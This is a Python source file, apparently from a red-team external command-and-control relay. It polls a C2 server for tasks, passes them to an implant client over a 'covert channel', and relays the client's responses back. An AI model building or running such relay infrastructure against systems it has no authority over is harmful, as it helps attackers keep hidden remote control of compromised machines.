import config
from utils import commonUtils

def checkForTasks(sock):
	"""
	Poll the c2 server for new tasks
	"""

	chunk = commonUtils.recvFrameFromC2(sock)
	if chunk < 0:
		if config.debug:
			print (commonUtils.color("Attempted to read %d bytes from c2 server", status=False, yellow=True)) %(len(chunk))
		# break # This should probably just return None or something
		return None
	else:
		if config.debug:
			if len(chunk) > 1:
				print (commonUtils.color("Recieved %d bytes from c2 server", status=False, yellow=True)) % (len(chunk))
			else:
				print (commonUtils.color("Recieved empty task from c2 server", status=False, yellow=True))
	if len(chunk) > 1:
		if config.verbose:
			print (commonUtils.color("Recieved new task from C2 server!") + "(%s bytes)") % (str(len(chunk)))
		if config.debug:
			print (commonUtils.color("NEW TASK: ", status=False, yellow=True) + "%s") % (chunk)
	return chunk

	##########



#def checkForResponse(sock):
def checkForResponse():
	"""
	Check the covert channel for a response from the client
	"""

	recvdResponse = commonUtils.retrieveData()
	if config.debug:
		if len(recvdResponse) > 1:
			print (commonUtils.color("Recieved %d bytes from client", status=False, yellow=True)) % (len(recvdResponse))
		else:
			print (commonUtils.color("Recieved empty response from client", status=False, yellow=True))
	if len(recvdResponse) > 1:
		if config.verbose:
			print (commonUtils.color("Recieved new task from C2 server!") + "(%s bytes)") % (str(len(recvdResponse)))
		if config.debug:
			print (commonUtils.color("RESPONSE: ", status=False, yellow=True) + "%s") % (recvdResponse)


	return recvdResponse

def relayResponse(sock, response):
	# Relays the response from the client to the c2 server
	# 'response', will have already been decoded from 'establishedSession.checkForResponse()'
	# -- Why is this it's own function? Because I have no idea what I'm doing
	if config.debug:
		print commonUtils.color("Relaying response to c2 server", status=False, yellow=True)
	commonUtils.sendFrameToC2(sock, response)

def relayTask(task):
	# Relays a new task from the c2 server to the client
	# 'task' will be encoded in the 'commonUtils.sendData()' function.
	if config.debug:
		print commonUtils.color("Relaying task to client", status=False, yellow=True)
	commonUtils.sendData(task)
